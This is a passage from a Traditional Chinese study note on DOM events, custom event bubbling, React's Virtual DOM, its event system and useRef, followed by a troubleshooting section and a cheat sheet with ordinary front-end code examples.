```js
document.addEventListener('error', e => {
  const img = e.target
  if (img.tagName === 'IMG' && !img.dataset.fallback) {
    img.dataset.fallback = 'true'
    img.src = '/images/fallback.png'
  }
}, { capture: true })
```

`data-fallback` 的判斷是為了避免備用圖也載入失敗時，無限觸發 `error` 事件。

### 自訂事件預設不冒泡

用 `dispatchEvent` 發出自己的事件時，有一個很容易忽略的預設值：`new Event()` 與 `new CustomEvent()` 預設 `bubbles: false`，祖先完全收不到。

```js
// ✗ 預設不冒泡，list 上的 listener 永遠不會被呼叫
item.dispatchEvent(new CustomEvent('todo:remove', { detail: { id: 42 } }))

// ✓ 明確開啟冒泡
item.dispatchEvent(new CustomEvent('todo:remove', { bubbles: true, detail: { id: 42 } }))

list.addEventListener('todo:remove', e => remove(e.detail.id))
```

開啟冒泡之後，自訂事件就能和原生 click 一樣用委派處理：子元件只負責「宣布發生了什麼」，由上層決定怎麼回應。

## 八、從命令式到宣告式：React 與 Virtual DOM

到這裡，原生 DOM 的全貌已經齊了：一棵樹、一條渲染流程、一組讀寫 API、一套事件機制。用這些就能寫出任何互動頁面，但寫法是**命令式**（imperative）的：資料改變時，你得自己決定「改哪個節點、怎麼改」。

```js
function addTodo(text) {
  todos.push(text)
  const li = document.createElement('li')
  li.textContent = text
  list.append(li)
  counter.textContent = `${todos.length} 項`
  emptyHint.hidden = todos.length > 0
}
```

一個「新增待辦」的動作，就要記得同步三個地方。等到還有刪除、編輯、篩選、排序，每一個動作都要手動維護所有相關節點，只要漏掉一處，資料和畫面就不一致。應用越大，這種 bug 越難追。

React 換了一個思路：你不再描述「怎麼改」，只描述「在某個 state 下，畫面應該長什麼樣」，也就是 `UI = f(state)`。state 改變時，React 重新呼叫你的 Component，拿到新的畫面描述，再自己算出該怎麼改 DOM。

```text
state 改變
→ Render：呼叫 Component，得到新的 React element 樹（俗稱 Virtual DOM）
→ Diff：與上一次的樹比較，找出差異（Reconciliation）
→ Commit：只把有差異的部分寫進真實 DOM
→ 瀏覽器照常跑 Layout / Paint
```

所謂 Virtual DOM，就是用純 JavaScript 物件描述的節點樹：

```jsx
<div className="card">
  <h1>{title}</h1>
  <p>{content}</p>
</div>
```

React 內部看到的大致是：

```js
{
  type: 'div',
  props: {
    className: 'card',
    children: [
      { type: 'h1', props: { children: title } },
      { type: 'p', props: { children: content } }
    ]
  }
}
```

當 `title` 改變，diff 會發現只有 `<h1>` 的文字不同，於是只改那一個真實 DOM 節點，`<div>` 與 `<p>` 原封不動。

> **📌 校正一個常見說法**：「Virtual DOM 比直接操作 DOM 快」並不精確。diff 本身是額外的運算，一段寫得剛好的手動 DOM 操作永遠比「先 diff 再操作」快。Virtual DOM 真正的價值是讓你能用**宣告式**的方式寫 UI，同時把「多餘的 DOM 寫入」壓到夠低，效能夠用、心智負擔大減。也正因如此，Svelte、Solid 等框架選擇在編譯期就算出要改哪些節點，完全不用 Virtual DOM。

### key 的角色

diff 比較清單時，需要知道「新清單的第 3 項和舊清單的哪一項是同一筆資料」。`key` 就是這個身分證。用陣列 index 當 key 時，只要清單在中間插入或刪除，所有後續項目的 key 都會位移，React 會誤以為它們是同一個元素而重用錯誤的 DOM 節點，造成輸入框內容錯位之類的 bug。key 應該用資料本身穩定且唯一的 id。

### React 的事件系統

React 的 `onClick` 並沒有真的掛在每個按鈕上。從 React 17 開始，React 在 **root container**（`createRoot` 的那個節點）上註冊 listener，利用的正是第七章的事件委派。React 把原生 event 包成 Synthetic Event，並在自己的元件樹上模擬冒泡，所以 `e.stopPropagation()` 在 React 裡同樣有效；需要 Capture 階段時則用 `onClickCapture`。

這裡的關鍵字是「在**元件樹**上」：React 的冒泡沿著元件的父子關係走，而不是 DOM 的父子關係。兩者平常一致，差異出現在 Portal。用 `createPortal` 把 modal 渲染到 `document.body` 底下時，modal 在 DOM 裡已經不是原元件的子孫，但它的 `onClick` 仍會冒泡到 React 裡的父元件。如果父元件上有 `onClick`，點 modal 裡的按鈕也會觸發它，看起來就像「點 A 卻觸發了 B」。另外，React 17 起 `onScroll` 不再冒泡，與原生行為一致。

### useRef：需要碰真實 DOM 的逃生門

大多數時候應該讓 React 管理 DOM，但有些事情只能直接對真實節點做：讓輸入框取得焦點、量測元素尺寸、把節點交給圖表或地圖這類第三方 library。這時用 `useRef`：

```tsx
import { useEffect, useRef } from 'react'

function SearchBox() {
  const inputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    inputRef.current?.focus()
  }, [])

  return <input ref={inputRef} placeholder="搜尋..." />
}
```

`ref.current` 就是真實的 `HTMLInputElement`，可以呼叫第三章那條繼承鏈上的任何方法。使用時有兩條界線：第一，`ref.current` 要在 commit 之後（`useEffect` 或 event handler 裡）才有值，在 render 過程中讀取會拿到 `null`；第二，可以讀取、呼叫方法，但**不要自己新增或刪除 React 管理的節點的子節點**，否則 React 下一次 commit 時會發現 DOM 和它記得的不一樣，直接報錯。

## 九、常見問題排查

### Cannot read properties of null

**錯誤訊息**

```text
Uncaught TypeError: Cannot read properties of null (reading 'addEventListener')
```

**原因**：腳本執行時，目標元素還沒被 Parser 解析到（通常是 `<script>` 放在 `<head>` 且沒加 `defer`），或 selector 打錯，`querySelector` 回傳 `null`。

**解法**：`<script>` 加上 `defer`，或改用 `type="module"`；先在 DevTools Console 執行同一個 selector 確認選得到。

### NodeList 不能 map

**錯誤訊息**

```text
Uncaught TypeError: items.map is not a function
```

**原因**：`querySelectorAll` 回傳 NodeList，不是 Array，只有 `forEach`，沒有 `map` / `filter` / `reduce`。

**解法**：`Array.from(items).map(...)` 或 `[...items].map(...)`。

### 動態新增的元素點了沒反應

**錯誤訊息**：無，handler 單純沒有執行。

**原因**：listener 是在元素被建立**之前**用 `querySelectorAll(...).forEach` 綁上的，之後新增的元素沒有 listener。

**解法**：改用事件委派，把 listener 綁在穩定存在的父節點上，用 `e.target.closest(...)` 判斷點到誰。

### React 報 removeChild 錯誤

**錯誤訊息**

```text
NotFoundError: Failed to execute 'removeChild' on 'Node': The node to be removed is not a child of this node.
```

**原因**：有 React 以外的程式改動了 React 管理的 DOM，可能是自己用 `ref` 或 `document.querySelector` 手動增刪節點、第三方 library 直接改寫容器內容，或瀏覽器的翻譯擴充功能把文字節點換掉。React commit 時找不到它記得的節點。

**解法**：React 管理的節點只透過 state 改變；第三方 library 給它一個 React 不渲染任何子節點的空容器，讓兩邊各管各的；若是翻譯擴充引起，可在不該被翻譯的區塊加 `translate="no"`。

### ref.current 是 null

**錯誤訊息**

```text
TypeError: Cannot read properties of null (reading 'focus')
```

**原因**：在 render 過程中（Component 函式本體）讀取 `ref.current`，此時 DOM 還沒 commit；或該元素被條件渲染，當下根本不存在。

**解法**：把存取移到 `useEffect` 或 event handler，並用 `ref.current?.focus()` 處理元素不存在的情況。

### await 之後 currentTarget 是 null

**錯誤訊息**

```text
TypeError: Cannot read properties of null (reading 'dataset')
```

**原因**：在 async handler 裡，`await` 之後才讀 `e.currentTarget`。event 傳遞結束時瀏覽器已把 `currentTarget` 設回 `null`。

**解法**：在 handler 第一行就把 `e.currentTarget` 存進變數，之後都用那個變數。

### 點外面關不掉 / 外層 handler 沒反應

**錯誤訊息**：無，外層或 `document` 上的 click handler 單純沒有被呼叫。

**原因**：event 路徑上某一層呼叫了 `stopPropagation()`，冒泡在那裡被切斷。來源可能是自己的程式，也可能是第三方元件。

**解法**：在 DevTools 選取被點的元素，打開 Elements 面板的 **Event Listeners** 分頁，檢查路徑上每一層掛了哪些 listener；或在 `document` 掛一個 `{ capture: true }` 的 listener，因為 Capture 階段在所有 Bubble handler 之前執行，用它確認 event 確實有發生。找到之後，把 `stopPropagation()` 改成在外層用 `e.target` 判斷。

## 十、速查表

| 概念 | 一句話說明 |
| --- | --- |
| DOM | 瀏覽器把 HTML 解析成的記憶體物件樹，加上操作它的標準 API |
| Node | 樹上的每一個節點：Element、Text、Comment、Document… |
| HTML vs DOM | HTML 是起點的設計圖，DOM 是執行期持續變化的實體 |
| CSSOM | CSS 規則的物件樹，與 DOM 合併成 Render Tree |
| Layout / Reflow | 計算位置與尺寸，改幾何屬性就會觸發，成本最高 |
| Layout Thrashing | 讀寫幾何屬性交錯，迫使瀏覽器反覆同步重排 |
| `defer` | 不擋 Parser，DOM 建好後才執行腳本 |
| `textContent` vs `innerHTML` | 前者當文字，後者當 HTML 解析，外部資料只能用前者 |
| Attribute vs Property | 前者是 HTML 寫的初始值，後者是物件的當前狀態 |
| EventListener | 事先在節點登記「發生某事件時呼叫這個函式」，由瀏覽器回頭呼叫 |
| `addEventListener` vs `onclick` | 前者可掛多個，後者只有一格，重複賦值會覆蓋 |
| 移除 listener | 要用同一個函式參考；掛在 `window` / `document` 上的不移除會洩漏 |
| 事件三階段 | Capture 往內 → Target → Bubble 往外，路徑在派送前就固定 |
| 冒泡 | 點擊子元素等於也點擊了所有祖先，預設的 handler 都在這個階段執行 |
| `target` vs `currentTarget` | 前者是實際被點到的節點，後者是目前執行 handler 的節點，派送結束後變 `null` |
| `stopPropagation` vs `preventDefault` | 前者擋傳遞，後者擋瀏覽器預設行為，兩者互不相干 |
| 事件委派 | 在父節點綁一次，靠冒泡處理所有子節點與動態新增的節點 |
| 不冒泡的事件 | 沒有 Bubble 階段，但仍會經過 Capture，可用 capture 委派 |
| Virtual DOM | React 用 JS 物件描述 UI，diff 後只改有差異的真實 DOM |
| `key` | 讓 diff 辨認清單項目身分，用穩定 id 而非 index |
| `useRef` | React 中拿到真實 DOM 節點的逃生門，只在 commit 後有值 |

## 連結

- [[web-frontend-moc]] — 前端主題入口
- [[javascript-typescript-react-foundations]] — 從 JavaScript 執行模型到 React Hook 的基礎教材，DOM 與事件是其中第一層
- [[react-frontend-development-roadmap]] — 學習路線第 1 階段即要求能解釋 DOM 樹與事件冒泡
- [[react]] — Hooks 詳解，含 `useRef` 操作 DOM 與 `useEffect` 執行時機
- [[typescript]] — `HTMLInputElement` 等 DOM 介面型別的來源
- [[HTML]] — HTML 語法原始筆記
- [[DOM 節點觀念]] — 本頁的原始來源筆記
